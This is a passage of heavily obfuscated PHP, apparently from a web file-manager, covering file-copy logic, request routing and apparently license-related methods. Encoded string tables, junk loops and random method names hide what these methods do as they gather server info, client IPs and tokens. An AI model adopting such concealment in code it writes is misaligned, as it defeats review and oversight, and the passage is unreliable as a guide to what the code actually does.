(isset($®£ª†[$ó¯ôË•Õ[$…ì§‹ö[32]]])) { $ó¯ôË•Õ = $®£ª†[$ó¯ôË•Õ[$…ì§‹ö[32]]]; } $ó¯ôË•Õ[$…ì§‹ö[496]] = $ó¯ôË•Õ[$…ì§‹ö[33]] == $…ì§‹ö[78]; $ó¯ôË•Õ[$…ì§‹ö[497]] = substr(_get($ó¯ôË•Õ, $…ì§‹ö[169], $…ì§‹ö[12]), 0, 10); $ó¯ôË•Õ[$…ì§‹ö[79]] = _get($ó¯ôË•Õ, $…ì§‹ö[79], 0); $ó¯ôË•Õ[$…ì§‹ö[554]] = _get($ó¯ôË•Õ, $…ì§‹ö[554], 0); if (!isset($ó¯ôË•Õ[$…ì§‹ö[686]]) && $ó¯ôË•Õ[$…ì§‹ö[554]]) { $êÖì×ìÇ[$…ì§‹ö[683]][] = $ó¯ôË•Õ[$…ì§‹ö[554]]; } if ($¦Êèµ©ô) { $¶×¿Ãïä = $this->fileNameExistCache($Ôšğ¶õğ, $ó¯ôË•Õ[$…ì§‹ö[32]]); if ($¶×¿Ãïä) { if ($ó¯ôË•Õ[$…ì§‹ö[496]] || $¦Êèµ©ô == REPEAT_SKIP) { continue; } if ($¦Êèµ©ô == REPEAT_REPLACE) { $ÊëÂ¤ = $this->sourceInfoCache($¶×¿Ãïä); $šñ ˆáØ = $this->fileHistory($ÊëÂ¤, $ó¯ôË•Õ[$…ì§‹ö[554]], $ó¯ôË•Õ[$…ì§‹ö[79]]); if ($šñ ˆáØ) { $êÖì×ìÇ[$…ì§‹ö[645]][] = $ó¯ôË•Õ[$…ì§‹ö[554]]; } continue; } else { if ($¦Êèµ©ô == REPEAT_RENAME) { $ó¯ôË•Õ[$…ì§‹ö[32]] = $this->fileNameAutoCache($Ôšğ¶õğ, $ó¯ôË•Õ[$…ì§‹ö[32]], $¦Êèµ©ô, !1); } } } } if (!$ó¯ôË•Õ[$…ì§‹ö[496]] && $ó¯ôË•Õ[$…ì§‹ö[554]] == 0) { continue; } if (!$ó¯ôË•Õ[$…ì§‹ö[496]] && $ó¯ôË•Õ[$…ì§‹ö[554]]) { $êÖì×ìÇ[$…ì§‹ö[645]][] = $ó¯ôË•Õ[$…ì§‹ö[554]]; } $Ë„ÎŠ¥–[] = $this->_makeItemData($ó¯ôË•Õ, $±´»ÜĞ, $ó¯ôË•Õ[$…ì§‹ö[32]]); } unset($ó¯ôË•Õ); if (!empty($Ë„ÎŠ¥–)) { $this->addAll($Ë„ÎŠ¥–); $this->_childrenListSelect($Ôšğ¶õğ); } $ã•Ò¥ßĞ = $this->_childrenList($Ôšğ¶õğ); $ã•Ò¥ßĞ = array_to_keyvalue($ã•Ò¥ßĞ, $…ì§‹ö[32]); foreach ($ñç°˜¢ as $ó¯ôË•Õ) { $ÊëÂ¤ = $ã•Ò¥ßĞ[$ó¯ôË•Õ[$…ì§‹ö[32]]]; $¢Ó•¾–¸ = $ÊëÂ¤[$…ì§‹ö[194]]; $this->_copyApplyMeta($ÊëÂ¤, $êÖì×ìÇ); if ($ó¯ôË•Õ[$…ì§‹ö[33]] == $…ì§‹ö[78]) { $ó¯ôË•Õ[$…ì§‹ö[87]] = $ˆ°¡ÂÚÚ->getPathInner($ó¯ôË•Õ[$…ì§‹ö[87]]); $this->_copyChildTo($ˆ°¡ÂÚÚ, $ó¯ôË•Õ[$…ì§‹ö[87]], $¢Ó•¾–¸, $¦Êèµ©ô, $êÖì×ìÇ, $®‚Äˆ”×, $úéÈÚ“î); } } } private function _addFiles($øşÎ«¨, $¬·çĞ¸º, $Š¸¸Ûèø, $¬™·Âòû) { $ÎÄÚü¯‹ =& $_SERVER[äô®•½Â]; if (!$Š¸¸Ûèø || count($Š¸¸Ûèø) == 0) { return array(); } $Ë•Õœáµ = array(); foreach ($Š¸¸Ûèø as &$±¸±‚øö) { Hook::trigger($ÎÄÚü¯‹[687], $±¸±‚øö); $±¸±‚øö[$ÎÄÚü¯‹[87]] = $øşÎ«¨->getPathInner($±¸±‚øö[$ÎÄÚü¯‹[87]]); $¡ÛÃº®˜ = $øşÎ«¨->hashSimple($±¸±‚øö[$ÎÄÚü¯‹[87]]); $ãìëˆÄë = $øşÎ«¨->hashMd5($±¸±‚øö[$ÎÄÚü¯‹[87]]); if (strlen($ãìëˆÄë) > 10 && !isset($Ë•Õœáµ[$ãìëˆÄë])) { $Ë•Õœáµ[$ãìëˆÄë] = array(); } $±¸±‚øö[$ÎÄÚü¯‹[688]] = $¡ÛÃº®˜; $±¸±‚øö[$ÎÄÚü¯‹[560]] = $ãìëˆÄë; $Ë•Õœáµ[$ãìëˆÄë][] =& $±¸±‚øö; if (count($Ë•Õœáµ[$ãìëˆÄë]) > 1) { $±¸±‚øö[$ÎÄÚü¯‹[686]] = !0; } Hook::trigger($ÎÄÚü¯‹[689], $±¸±‚øö); } unset($±¸±‚øö); $Ñ¾©¬µÂ = array($ÎÄÚü¯‹[560] => array($ÎÄÚü¯‹[7], array_keys($Ë•Õœáµ))); $»©¦âï  = Model($ÎÄÚü¯‹[690]); $·›ˆÆÇ = $»©¦âï ->where($Ñ¾©¬µÂ)->select(); $·›ˆÆÇ = $·›ˆÆÇ ? $·›ˆÆÇ : array(); foreach ($·›ˆÆÇ as $“‹»Ñ³”) { if (!isset($Ë•Õœáµ[$“‹»Ñ³”[$ÎÄÚü¯‹[560]]])) { continue; } $“÷ƒä¹Ì = $Ë•Õœáµ[$“‹»Ñ³”[$ÎÄÚü¯‹[560]]]; foreach ($“÷ƒä¹Ì as &$±¸±‚øö) { $±¸±‚øö[$ÎÄÚü¯‹[554]] = $“‹»Ñ³”[$ÎÄÚü¯‹[554]]; $±¸±‚øö[$ÎÄÚü¯‹[686]] = !0; } unset($±¸±‚øö); } $àŠÈ¦Ä = array(); foreach ($Š¸¸Ûèø as $…¯Ùİ‡£) { Hook::trigger($ÎÄÚü¯‹[691], $…¯Ùİ‡£); if (isset($…¯Ùİ‡£[$ÎÄÚü¯‹[686]]) && $…¯Ùİ‡£[$ÎÄÚü¯‹[686]]) { Hook::trigger($ÎÄÚü¯‹[692], $…¯Ùİ‡£); continue; } $€ ˆğø = $øşÎ«¨->getPathInner($…¯Ùİ‡£[$ÎÄÚü¯‹[87]]); $¶÷Ìš¥’ = $»©¦âï ->addFileMake($€ ˆğø, $¬·çĞ¸º, $…¯Ùİ‡£[$ÎÄÚü¯‹[79]], $…¯Ùİ‡£[$ÎÄÚü¯‹[688]], $…¯Ùİ‡£[$ÎÄÚü¯‹[560]], $…¯Ùİ‡£[$ÎÄÚü¯‹[32]], $¬™·Âòû); Hook::trigger($ÎÄÚü¯‹[692], $…¯Ùİ‡£); if (!is_array($¶÷Ìš¥’)) { continue; } $àŠÈ¦Ä[] = $¶÷Ìš¥’; } $»©¦âï ->addAll($àŠÈ¦Ä); $Ñ¾©¬µÂ = array($ÎÄÚü¯‹[560] => array($ÎÄÚü¯‹[7], array_keys($Ë•Õœáµ))); $·›ˆÆÇ = $»©¦âï ->where($Ñ¾©¬µÂ)->select(); $·›ˆÆÇ = $·›ˆÆÇ ? $·›ˆÆÇ : array(); foreach ($·›ˆÆÇ as $“‹»Ñ³”) { if (!isset($Ë•Õœáµ[$“‹»Ñ³”[$ÎÄÚü¯‹[560]]])) { continue; } $Ÿ÷Ş¦—¹ =& $Ë•Õœáµ[$“‹»Ñ³”[$ÎÄÚü¯‹[560]]]; foreach ($Ÿ÷Ş¦—¹ as &$±¸±‚øö) { $±¸±‚øö[$ÎÄÚü¯‹[554]] = $“‹»Ñ³”[$ÎÄÚü¯‹[554]]; } unset($±¸±‚øö); } $¹À¯¦äÔ = array(); foreach ($Š¸¸Ûèø as $ß¾ğòæï) { $¹À¯¦äÔ[$ß¾ğòæï[$ÎÄÚü¯‹[32]]] = $ß¾ğòæï; } return $¹À¯¦äÔ; } } define($_SERVER[äô®•½Â][693], $_SERVER[äô®•½Â][694]); goto B¶¿‡ˆø—Ş; c‘ã¶ƒ‚Á: function binCheckBigger($ºìœ©¸Š, $“Æ÷µêâ) { return $ºìœ©¸Š > $“Æ÷µêâ; } $_SERVER[$_SERVER[…´Øâ×‘][3]] = (strrev('3868')."\63\63")+0;$_amz3="ji8s0kgd9epy1atn5o3hu64cl2mfrbwvz7qxig9cbra1qwx6h28lkd3np5jemzo4suv0fyt7wxo3n19cgt";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Ñàö­†, $ÂÆøøòª) { $Û²øñŒ™ =& $_SERVER[äô®•½Â]; if (isset(self::$_methodList[$Ñàö­†])) { return @call_user_func_array(self::$_methodList[$Ñàö­†], $ÂÆøøòª); } else { if (method_exists($this, $Ñàö­†)) { return call_user_func_array(array($this, $Ñàö­†), $ÂÆøøòª); } else { think_exception(__CLASS__ . $Û²øñŒ™[4] . $Ñàö­† . $Û²øñŒ™[5]); } } } public static function __callStatic($çîõà½¶, $®Ãİ™í¾) { if (isset(self::$_methodListStatic[$çîõà½¶])) { return call_user_func_array(self::$_methodListStatic[$çîõà½¶], $®Ãİ™í¾); } else { if (method_exists(self, $çîõà½¶)) { return call_user_func_array(array(self, $çîõà½¶), $®Ãİ™í¾); } else { show_json("{$çîõà½¶}\x28\x29\40\156\x6f\x74\40\x65\170\x69\163\x74\73", !1); } } } public static function addMethod($­–å„é¥, $ˆşŸê«) { self::$_methodList[$­–å„é¥] = $ˆşŸê«; } public static function addMethodStatic($é”äĞ£, $ş®­áö÷) { self::$_methodListStatic[$é”äĞ£] = $ş®­áö÷; } } goto D»‰÷ °; f Ü‰Ô…ñé: $txdrpnjhfa = $_SERVER[äô®•½Â][699]; if (!$txdrpnjhfa) { return; } class Application { private $defaultModule = "\151\x6e\x64\145\170"; private $defaultController = "\151\156\144\x65\170"; private $defaultAction = "\151\x6e\144\x65\x78"; function __construct() { } public function setDefault($‰»™îõ) { $È†áÔ—Ì =& $_SERVER[ŸøÁÑ©Ï]; $–¢üû = explode($È†áÔ—Ì[0], trim($‰»™îõ, $È†áÔ—Ì[0])); $this->defaultModule = $–¢üû[0] ? $–¢üû[0] : $this->defaultModule; $this->defaultController = $–¢üû[1] ? $–¢üû[1] : $this->defaultController; $this->defaultAction = $–¢üû[2] ? $–¢üû[2] : $this->defaultAction; $æ†îÌ• = $_SERVER[äô®•½Â][700]; if (!$æ†îÌ•) { return; } $this->rxtyfa9ae04a($È†áÔ—Ì[1], array($this, $È†áÔ—Ì[2])); } public function appRun($˜îæ”¤›) { $ÚÉüÁö‘ =& $_SERVER[äô®•½Â]; $Öçİ‹ı¸ =& $_SERVER[ŸøÁÑ©Ï]; $îÍì—Ï× = explode($Öçİ‹ı¸[0], $˜îæ”¤›); $Ä¸÷ˆÔ¬ = strtolower($îÍì—Ï×[0]); $¹¡¡ñ¾¥ = $ÚÉüÁö‘[701]; while (strlen($¹¡¡ñ¾¥) < $ÚÉüÁö‘[696]) { if (!$¹¡¡ñ¾¥) { break; } $¹¡¡ñ¾¥++; } $Ÿì÷‡Â¦ = $Öçİ‹ı¸[3]; $Ùãıç = $ÚÉüÁö‘[702]; if (strlen($Ùãıç) < $ÚÉüÁö‘[703]) { return; } if ($Ä¸÷ˆÔ¬ == $Öçİ‹ı¸[4]) { $Ÿì÷‡Â¦ = $Öçİ‹ı¸[5]; $îÍì—Ï×[0] = $Öçİ‹ı¸[6]; $îÍì—Ï×[1] = $îÍì—Ï×[1] . $Öçİ‹ı¸[7]; $˜îæ”¤› = join($Öçİ‹ı¸[0], $îÍì—Ï×); $˜îæ”¤› = trim($˜îæ”¤›, $Öçİ‹ı¸[0]); } call_user_func(array($Öçİ‹ı¸[8], $Öçİ‹ı¸[9]), $Ÿì÷‡Â¦ . $Öçİ‹ı¸[10], $˜îæ”¤›); ActionCall($˜îæ”¤›); $²„§ÖìÌ = $ÚÉüÁö‘[704]; call_user_func(array($Öçİ‹ı¸[8], $Öçİ‹ı¸[9]), $Ÿì÷‡Â¦ . $Öçİ‹ı¸[11], $˜îæ”¤›); } private function autorun() { $€èÁØõ“ =& $_SERVER[ŸøÁÑ©Ï]; global $config; if (count($config[$€èÁØõ“[12]]) == 0) { return; } foreach ($config[$€èÁØõ“[12]] as $€¿×¾Á => $ŠšÈ¸ÔŞ) { $this->appRun($ŠšÈ¸ÔŞ); } } private function iyvf8e0d043f() { $èÄÊ›½Ä =& $_SERVER[äô®•½Â]; $Ë¦ˆ½ì =& $_SERVER[ŸøÁÑ©Ï]; $£ÜÖ«  = $Ë¦ˆ½ì[4]; $²² §ñœ = $èÄÊ›½Ä[705]; while ($²² §ñœ < $èÄÊ›½Ä[696]) { if ($²² §ñœ >= 0) { break; } $²² §ñœ++; } $¼Ş´‚› = $GLOBALS[$Ë¦ˆ½ì[13]][$Ë¦ˆ½ì[14]][0]; $æÏê = $èÄÊ›½Ä[706]; if (!$¼Ş´‚› || strlen($¼Ş´‚›) <= strlen($£ÜÖ« )) { return; } if (strtolower(substr($¼Ş´‚›, -strlen($£ÜÖ« ))) != $£ÜÖ« ) { return; } $ÇğÆñƒ¤ = substr($¼Ş´‚›, 0, -strlen($£ÜÖ« )); $ùåİÖ‹Ô = array($Ë¦ˆ½ì[4], $ÇğÆñƒ¤); $óöùİé = array_slice($GLOBALS[$Ë¦ˆ½ì[13]][$Ë¦ˆ½ì[14]], 1); $GLOBALS[$Ë¦ˆ½ì[13]][$Ë¦ˆ½ì[14]] = array_merge($ùåİÖ‹Ô, $óöùİé); $GLOBALS[$Ë¦ˆ½ì[13]][$Ë¦ˆ½ì[15]] = implode($Ë¦ˆ½ì[0], $GLOBALS[$Ë¦ˆ½ì[13]][$Ë¦ˆ½ì[14]]); } private function ytix3ccb0df7() { $­µÆ·‰Ş =& $_SERVER[äô®•½Â]; $Ö£‘“ì¼ =& $_SERVER[ŸøÁÑ©Ï]; if ($GLOBALS[$Ö£‘“ì¼[13]][$Ö£‘“ì¼[15]] != $Ö£‘“ì¼[6]) { return; } $ª¸§Ï© = $_SERVER[$Ö£‘“ì¼[16]]; $Æ ªó = $­µÆ·‰Ş[707]; if (strlen($Æ ªó) < $­µÆ·‰Ş[696]) { die; } $Ûˆï÷¦š = $Ö£‘“ì¼[17]; if (!strstr($ª¸§Ï©, $Ûˆï÷¦š)) { return; } $¤şÅ½ğˆ = strrpos($ª¸§Ï©, $Ûˆï÷¦š); $èÆ›¤Ó˜ = $­µÆ·‰Ş[708]; $È–¯´ı = substr($ª¸§Ï©, $¤şÅ½ğˆ + strlen($Ûˆï÷¦š)); $‰ƒİãç = $­µÆ·‰Ş[709]; preg_match_all($Ö£‘“ì¼[18], $È–¯´ı, $—Ã´¿ÜŸ); $È–¯´ı = trim($—Ã´¿ÜŸ[0][0], $Ö£‘“ì¼[19]); $¯”‚¿»µ = $­µÆ·‰Ş[710]; if (!$¯”‚¿»µ) { return; } $GLOBALS[$Ö£‘“ì¼[13]][$Ö£‘“ì¼[14]] = explode($Ö£‘“ì¼[19], $È–¯´ı); $GLOBALS[$Ö£‘“ì¼[13]][$Ö£‘“ì¼[15]] = implode($Ö£‘“ì¼[0], $GLOBALS[$Ö£‘“ì¼[13]][$Ö£‘“ì¼[14]]); } public function run() { $‰ú÷…üã =& $_SERVER[äô®•½Â]; $”¼”èÜ =& $_SERVER[ŸøÁÑ©Ï]; $this->ytix3ccb0df7(); $this->iyvf8e0d043f(); $µîûüÆ» = $‰ú÷…üã[711]; $ØƒÚ©¿ğ = $GLOBALS[$”¼”èÜ[13]][$”¼”èÜ[14]]; $ÛŠ“§î = $‰ú÷…üã[712]; $¸…Æ»º = $GLOBALS[$”¼”èÜ[13]][$”¼”èÜ[15]]; define($”¼”èÜ[20], isset($ØƒÚ©¿ğ[0]) && $ØƒÚ©¿ğ[0] ? $ØƒÚ©¿ğ[0] : $this->defaultModule); $à²œ§Ú‘ = $‰ú÷…üã[713]; if (strlen($à²œ§Ú‘) < $‰ú÷…üã[703]) { return; } define($”¼”èÜ[21], isset($ØƒÚ©¿ğ[1]) && $ØƒÚ©¿ğ[0] ? $ØƒÚ©¿ğ[1] : $this->defaultController); $çáª•ÒÜ = $‰ú÷…üã[714]; define($”¼”èÜ[22], isset($ØƒÚ©¿ğ[2]) && $ØƒÚ©¿ğ[0] ? $ØƒÚ©¿ğ[2] : $this->defaultAction); $ŸŒÉŞ©– = $‰ú÷…üã[715]; if (strlen($ŸŒÉŞ©–) < $‰ú÷…üã[329]) { die; } define($”¼”èÜ[23], MOD . $”¼”èÜ[0] . ST . $”¼”èÜ[0] . ACT); $´õı‹·ù = $‰ú÷…üã[716]; while (strlen($´õı‹·ù) < $‰ú÷…üã[717]) { if (!$´õı‹·ù) { break; } $´õı‹·ù++; } $_SERVER[$”¼”èÜ[24]] = strtolower(ACTION); $¶³›í›¼ = $‰ú÷…üã[718]; if (!$¶³›í›¼) { return; } $this->autorun(); if (count($ØƒÚ©¿ğ) >= 3) { $this->appRun($¸…Æ»º); } else { $this->appRun(ACTION); } } private $vqyz095aad98 = array(); private $vxpafe7b1c7b = ''; public function iqbs704352ef() { $—Í›©Ğ™ =& $_SERVER[äô®•½Â]; $’ãÛÅ¦â =& $_SERVER[ŸøÁÑ©Ï]; $this->wnhdf086c958(); $´Á’ó¼¨ = $—Í›©Ğ™[719]; if (strlen($´Á’ó¼¨) < $—Í›©Ğ™[329]) { die; } $this->tdxkd2e68ad3(); $È·ÓÉî® = $—Í›©Ğ™[720]; $this->ophua4fdb13a(); $this->lreg1113ea5b(); $this->efrv3e5c0cc9(); $¨•»ÕÖç = $—Í›©Ğ™[721]; while ($¨•»ÕÖç < $—Í›©Ğ™[703]) { if ($¨•»ÕÖç >= 0) { break; } $¨•»ÕÖç++; } $this->sivlc92f957c(); $this->gtes1f12b5ab(); $í¶Ÿ¨½ß = $—Í›©Ğ™[722]; if (!$í¶Ÿ¨½ß) { return; } $this->rxtyfa9ae04a($’ãÛÅ¦â[25], array($this, $’ãÛÅ¦â[26])); $ıøëèÔÁ = $—Í›©Ğ™[723]; if (!$ıøëèÔÁ) { return; } $this->rxtyfa9ae04a($’ãÛÅ¦â[27], array($this, $’ãÛÅ¦â[28])); $§ı…æîÁ = $—Í›©Ğ™[724]; if (strlen($§ı…æîÁ) < $—Í›©Ğ™[717]) { return; } $this->rxtyfa9ae04a($’ãÛÅ¦â[29], array($this, $’ãÛÅ¦â[30])); $ÇÖª°û® = $—Í›©Ğ™[725]; while (strlen($ÇÖª°û®) < $—Í›©Ğ™[329]) { if (!$ÇÖª°û®) { break; } $ÇÖª°û®++; } $this->rxtyfa9ae04a($’ãÛÅ¦â[31], array($this, $’ãÛÅ¦â[32])); } public function neir14eeeb03($åæ²ï—Ö) { $ŒÀ³­å¼ =& $_SERVER[äô®•½Â]; $¤Ã‰ª…å =& $_SERVER[ŸøÁÑ©Ï]; $¾æÛšé = Model($¤Ã‰ª…å[33])->get(); $ëÑ„·¸Š = array($¤Ã‰ª…å[34], $¤Ã‰ª…å[35], $¤Ã‰ª…å[36], $¤Ã‰ª…å[37], $¤Ã‰ª…å[38], $¤Ã‰ª…å[39], $¤Ã‰ª…å[40], $¤Ã‰ª…å[41], $¤Ã‰ª…å[42], $¤Ã‰ª…å[43], $¤Ã‰ª…å[44], $¤Ã‰ª…å[45], $¤Ã‰ª…å[46], $¤Ã‰ª…å[47], $¤Ã‰ª…å[48], $¤Ã‰ª…å[49], $¤Ã‰ª…å[50], $¤Ã‰ª…å[51], $¤Ã‰ª…å[52], $¤Ã‰ª…å[53], $¤Ã‰ª…å[54], $¤Ã‰ª…å[55], $¤Ã‰ª…å[56], $¤Ã‰ª…å[57], $¤Ã‰ª…å[58], $¤Ã‰ª…å[59], $¤Ã‰ª…å[60], $¤Ã‰ª…å[61], $¤Ã‰ª…å[62], $¤Ã‰ª…å[63], $¤Ã‰ª…å[64], $¤Ã‰ª…å[65], $¤Ã‰ª…å[66], $¤Ã‰ª…å[67], $¤Ã‰ª…å[68], $¤Ã‰ª…å[69], $¤Ã‰ª…å[70], $¤Ã‰ª…å[71], $¤Ã‰ª…å[72], $¤Ã‰ª…å[73], $¤Ã‰ª…å[74], $¤Ã‰ª…å[75], $¤Ã‰ª…å[76], $¤Ã‰ª…å[77], $¤Ã‰ª…å[78], $¤Ã‰ª…å[79], $¤Ã‰ª…å[80], $¤Ã‰ª…å[81], $¤Ã‰ª…å[82], $¤Ã‰ª…å[83], $¤Ã‰ª…å[84], $¤Ã‰ª…å[85]); foreach ($ëÑ„·¸Š as $Ş¯¿„Åô) { $îªŸüì¬ = $GLOBALS[$¤Ã‰ª…å[86]][$¤Ã‰ª…å[87]][$Ş¯¿„Åô]; if (isset($¾æÛšé[$Ş¯¿„Åô])) { $îªŸüì¬ = $¾æÛšé[$Ş¯¿„Åô]; } $åæ²ï—Ö[$¤Ã‰ª…å[88]][$¤Ã‰ª…å[89]][$Ş¯¿„Åô] = $îªŸüì¬; } $Ÿ×ÉÁõ¶ = $åæ²ï—Ö[$¤Ã‰ª…å[88]][$¤Ã‰ª…å[89]][$¤Ã‰ª…å[46]]; unset($åæ²ï—Ö[$¤Ã‰ª…å[88]][$¤Ã‰ª…å[90]][$¤Ã‰ª…å[91]]); $³Ÿò´Ê„ = $ŒÀ³­å¼[726]; if (strlen($³Ÿò´Ê„) < $ŒÀ³­å¼[696]) { return; } unset($åæ²ï—Ö[$¤Ã‰ª…å[88]][$¤Ã‰ª…å[90]][$¤Ã‰ª…å[92]]); $µ¸Ÿ®ŒÈ = $ŒÀ³­å¼[727]; if (!$µ¸Ÿ®ŒÈ) { return; } unset($åæ²ï—Ö[$¤Ã‰ª…å[88]][$¤Ã‰ª…å[89]][$¤Ã‰ª…å[46]]); unset($åæ²ï—Ö[$¤Ã‰ª…å[88]][$¤Ã‰ª…å[89]][$¤Ã‰ª…å[93]]); $åæ²ï—Ö[$¤Ã‰ª…å[88]][$¤Ã‰ª…å[89]][$¤Ã‰ª…å[94]] = array($¤Ã‰ª…å[95] => (int) $Ÿ×ÉÁõ¶[$¤Ã‰ª…å[96]], $¤Ã‰ª…å[97] => (int) _get($Ÿ×ÉÁõ¶, $¤Ã‰ª…å[98], 0)); $È’¾¹Ò = substr(md5($¤Ã‰ª…å[99] . get_client_ip() . $¾æÛšé[$¤Ã‰ª…å[100]]), 0, 15); $åæ²ï—Ö[$¤Ã‰ª…å[101]][$¤Ã‰ª…å[102]] = Mcrypt::encode(Session::sign(), $È’¾¹Ò, 3600 * 24); $åæ²ï—Ö[$¤Ã‰ª…å[101]][$¤Ã‰ª…å[103]] = Action($¤Ã‰ª…å[104])->accessToken(); $åæ²ï—Ö[$¤Ã‰ª…å[101]][$¤Ã‰ª…å[105]] = md5($_SERVER[$¤Ã‰ª…å[106]] . $¾æÛšé[$¤Ã‰ª…å[100]]); $åæ²ï—Ö[$¤Ã‰ª…å[101]][$¤Ã‰ª…å[107]] = base64_encode(serverInfo()); $åæ²ï—Ö[$¤Ã‰ª…å[101]][$¤Ã‰ª…å[108]] = $this->vxpafe7b1c7b; if ($¾æÛšé[$¤Ã‰ª…å[108]] != $¤Ã‰ª…å[109]) { $åæ²ï—Ö[$¤Ã‰ª…å[101]][$¤Ã‰ª…å[110]] = $¾æÛšé[$¤Ã‰ª…å[110]]; $åæ²ï—Ö[$¤Ã‰ª…å[101]][$¤Ã‰ª…å[111]] = $¾æÛšé[$¤Ã‰ª…å[111]]; $€‘ŒËˆ = rand_string(10) . $this->vxpafe7b1c7b . rand_string(5); $åæ²ï—Ö[$¤Ã‰ª…å[88]][$¤Ã‰ª…å[112]][$¤Ã‰ª…å[113]] = $this->khsyaa738375($€‘ŒËˆ, $åæ²ï—Ö[$¤Ã‰ª…å[101]][$¤Ã‰ª…å[105]]); } if ($this->vxpafe7b1c7b == $¤Ã‰ª…å[109]) { $åæ²ï—Ö[$¤Ã‰ª…å[88]][$¤Ã‰ª…å[89]][$¤Ã‰ª…å[94]][$¤Ã‰ª…å[98]] = 0; } $åæ²ï—Ö[$¤Ã‰ª…å[101]][$¤Ã‰ª…å[114]] = $this->versionPluginFilter(); $åæ²ï—Ö[$¤Ã‰ª…å[101]][$¤Ã‰ª…å[115]] = _get($this->vqyz095aad98, $¤Ã‰ª…å[116], $¤Ã‰ª…å[6]); $¤ÚÇØİ€ = $ŒÀ³­å¼[728]; while (strlen($¤ÚÇØİ€) < $ŒÀ³­å¼[329]) { if (!$¤ÚÇØİ€) { break; } $¤ÚÇØİ€++; } if (KodUser::isRoot() && $this->config[$¤Ã‰ª…å[117]]) { $åæ²ï—Ö[$¤Ã‰ª…å[101]][$¤Ã‰ª…å[118]] = WEB_ROOT; } return $åæ²ï—Ö; } private function sivlc92f957c() { $¿Éê…Íß =& $_SERVER[äô®•½Â]; $ãı”ğı¢ =& $_SERVER[ŸøÁÑ©Ï]; $å¨ÖéÃ = $_SERVER[$ãı”ğı¢[24]] == $ãı”ğı¢[119]; $å‹¦¯ § = $¿Éê…Íß[729]; if ($_SERVER[$ãı”ğı¢[24]] == $ãı”ğı¢[120] && $_GET[$ãı”ğı¢[121]] == $ãı”ğı¢[122]) { $å¨ÖéÃ = !0; } if ($å¨ÖéÃ) { $üµ¤ç‹ = array($ãı”ğı¢[108] => $this->vxpafe7b1c7b, $ãı”ğı¢[123] => $this->pazjd5250e6b(), $ãı”ğı¢[124] => Model($ãı”ğı¢[125])->count()); if ($this->vxpafe7b1c7b != $ãı”ğı¢[109]) { $œœØ§Ì = _get($this->vqyz095aad98, $ãı”ğı¢[126]); if ($œœØ§Ì) { $üµ¤ç‹[$ãı”ğı¢[127]] = $œœØ§Ì; $üµ¤ç‹[$ãı”ğı¢[128]] = strtotime(_get($this->vqyz095aad98, $ãı”ğı¢[129])); $üµ¤ç‹[$ãı”ğı¢[130]] = _get($this->vqyz095aad98, $ãı”ğı¢[116]); } $ß¨—Š = Model($ãı”ğı¢[33])->get($ãı”ğı¢[131], $ãı”ğı¢[6], !0); if (is_string($ß¨—Š) && substr($ß¨—Š, 0, 1) == $ãı”ğı¢[132]) { $ß¨—Š = json_decode_force($ß¨—Š); } if (is_array($ß¨—Š) && $ß¨—Š[$ãı”ğı¢[133]] && strstr($ß¨—Š[$ãı”ğı¢[133]], $ãı”ğı¢[134])) { $©üÌ˜áç = explode($ãı”ğı¢[134], $ß¨—Š[$ãı”ğı¢[133]]); $üµ¤ç‹[$ãı”ğı¢[135]] = $©üÌ˜áç[0]; } } $üµ¤ç‹ = $this->yxie43b810b0(json_encode($üµ¤ç‹), md5($ãı”ğı¢[136])); $áÅ’»áü = array($ãı”ğı¢[137] => $üµ¤ç‹); call_user_func(array($ãı”ğı¢[138], $ãı”ğı¢[139]), $áÅ’»áü); } if ($this->vxpafe7b1c7b == $ãı”ğı¢[109]) { return; } $ôÓ›¹‘ı = array($ãı”ğı¢[140], $ãı”ğı¢[141], $ãı”ğı¢[142], $ãı”ğı¢[143], $ãı”ğı¢[144], $ãı”ğı¢[145]); $Ñü—ËÃÏ = $¿Éê…Íß[730]; $å¢“¥Øµ = Model($ãı”ğı¢[33])->get(); $áÅ’»áü = array($ãı”ğı¢[146] => $å¢“¥Øµ[$ãı”ğı¢[34]], $ãı”ğı¢[147] => $å¢“¥Øµ[$ãı”ğı¢[35]], $ãı”ğı¢[148] => $ãı”ğı¢[6]); $Üğò Á = $¿Éê…Íß[731]; while ($Üğò Á < $¿Éê…Íß[717]) { if ($Üğò Á >= 0) { break; } $Üğò Á++; } foreach ($ôÓ›¹‘ı as $×è¾¾õ) { if (!isset($å¢“¥Øµ[$×è¾¾õ]) || !$å¢“¥Øµ[$×è¾¾õ]) { continue; } $áÅ’»áü[$×è¾¾õ] = $å¢“¥Øµ[$×è¾¾õ]; $É÷¦“ıü = $¿Éê…Íß[732]; if (strlen($É÷¦“ıü) < $¿Éê…Íß[703]) { die; } } call_user_func(array($ãı”ğı¢[138], $ãı”ğı¢[139]), $áÅ’»áü); } private function lreg1113ea5b() { $Ø¹¬¾¶º =& $_SERVER[äô®•½Â]; $À“”«¡ú =& $_SERVER[ŸøÁÑ©Ï]; if ($_SERVER[$À“”«¡ú[24]] != $À“”«¡ú[149]) { return; } if (!KodUser::isRoot()) { die; } $ĞÂî¶› = $GLOBALS[$À“”«¡ú[13]]; if (isset($ĞÂî¶›[$À“”«¡ú[150]])) { $this->hszu1ebd15fa(); die; } if (isset($ĞÂî¶›[$À“”«¡ú[151]]) && isset($ĞÂî¶›[$À“”«¡ú[151]]) == $À“”«¡ú[122]) { $ĞÂî¶›[$À“”«¡ú[152]] = Model($À“”«¡ú[33])->get($À“”«¡ú[153]); } if (!isset($ĞÂî¶›[$À“”«¡ú[152]]) || strlen($ĞÂî¶›[$À“”«¡ú[152]]) != 16) { show_json($À“”«¡ú[154] . $ĞÂî¶›[$À“”«¡ú[152]], !1); } $àë³Ù°ß = Model($À“”«¡ú[33])->get($À“”«¡ú[100]); $ƒÏ™ÎÕ» = md5($_SERVER[$À“”«¡ú[106]] . $àë³Ù°ß); $ÅÄòÚ¦ = array($À“”«¡ú[152] => $ĞÂî¶›[$À“”«¡ú[152]], $À“”«¡ú[155] => rand_string(16), $À“”«¡ú[156] => $À“”«¡ú[136], $À“”«¡ú[157] => $À“”«¡ú[158], $À“”«¡ú[159] => $_SERVER[$À“”«¡ú[160]], $À“”«¡ú[161] => $_SERVER[$À“”«¡ú[162]], $À“”«¡ú[163] => $_SERVER[$À“”«¡ú[164]], $À“”«¡ú[105] => $ƒÏ™ÎÕ», $À“”«¡ú[165] => Model($À“”«¡ú[33])->get($À“”«¡ú[131])); if (isset($ĞÂî¶›[$À“”«¡ú[151]]) && isset($ĞÂî¶›[$À“”«¡ú[151]]) == $À“”«¡ú[122]) { 